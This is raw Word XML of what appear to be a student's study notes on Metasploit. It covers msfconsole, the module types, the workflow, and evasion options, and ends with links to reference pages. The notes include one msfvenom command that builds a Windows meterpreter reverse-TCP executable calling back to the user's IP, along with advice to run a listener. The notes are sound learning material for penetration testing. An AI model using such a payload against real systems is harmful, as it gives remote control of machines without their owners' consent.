          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> usage: Metasploit GitHub wiki / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> guides</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78EE1460" w14:textId="3346ECCD" w:rsidR="00F42DE6" w:rsidRDefault="00F42DE6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F73DC1" w14:textId="1744236B" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SUMMARY:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7DCE0C" w14:textId="1AE92F13" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> is Metasploit’s main CLI interface for searching, configuring, and running modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58568351" w14:textId="2AD9A90F" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Module types</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F895EB" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> —</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacks vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209C0388" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Payload</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> — code executed after exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4043DD" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Auxiliary</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> — scanners, brute-forcers, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68782563" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Post</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> — post-exploitation tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643F3854" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Encoder</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> — modifies payloads to avoid bad characters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6860E7E6" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>NOP</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> — padding instructions for exploits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AD4648" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Evasion</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> — techniques to avoid detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6E2F4A" w14:textId="7EBFAF8F" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Workflow</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>: search → use → show options → set → exploit/run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501922BE" w14:textId="5CC7FF5F" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>show evasion</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> lists evasion options for supported modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F56AC56" w14:textId="7F9CD200" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> builds </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>payloads;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FEF271" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST=&lt;your-IP&gt; LPORT=4444 -f exe -o file.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A7C04D" w14:textId="015D9CA5" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Listeners</w:t>
      </w:r>
      <w:r w:rsidRPr="00F42DE6">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>: exploit/multi/handler is used to catch reverse connections — always start it before running payloads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B94834A" w14:textId="77777777" w:rsidR="00F42DE6" w:rsidRPr="00F42DE6" w:rsidRDefault="00F42DE6" w:rsidP="00F42DE6">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00F42DE6" w:rsidRPr="00F42D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F6511D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="151C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313C0D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EC68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80537D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6C90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714A2D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E5D0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D02617"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0472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903429">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="958684462">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1008213260">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1252933970">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1716734466">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1084574136">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1279947782">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="775439752">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="184053480">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="41712042">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="948699996">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="304510258">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="532501536">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="16708637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6946"/>
    <w:rsid w:val="008646CA"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F42D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CB3E9"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{3DBB6F6E-9546-43C5-AECD-E9BC9089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42D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etasploit.com/docs/modules.html?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.rapid7.com/metasploit/msf-overview/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.offsec.com/metasploit-unleashed/binary-payloads/?utm_source=chatgpt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etasploit.com/docs/modules.html?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://rapid7.github.io/metasploit-framework/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hackers-arise.com/metasploit-basics-for-hackers-part-24-the-new-evasion-modules-in-metasploit-5/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html?utm_source=chatgp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apid7/metasploit-framework/wiki/How-to-use-msfvenom?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html?utm_source=chatgpt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rapid7.com/metasploit/working-with-payloads/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.metasploit.com/docs/modules.html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apid7.github.io/metasploit-framework/docs/pentesting/metasploit-guide-setting-module-options.html?utm_source=chatgpt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metasploit.com/docs/modules.html?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.rapid7.com/metasploit/msf-overview/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pid7.com/blog/post/2014/03/28/like-msfvenom-heres-a-faster-way-to-generate-stand-alone-metasploit-payloads/?utm_source=chatgpt.com" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.offsec.com/metasploit-unleashed/msfconsole-commands/?utm_source=chatgpt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22-NTU-CS-1200</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-10T17:45:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>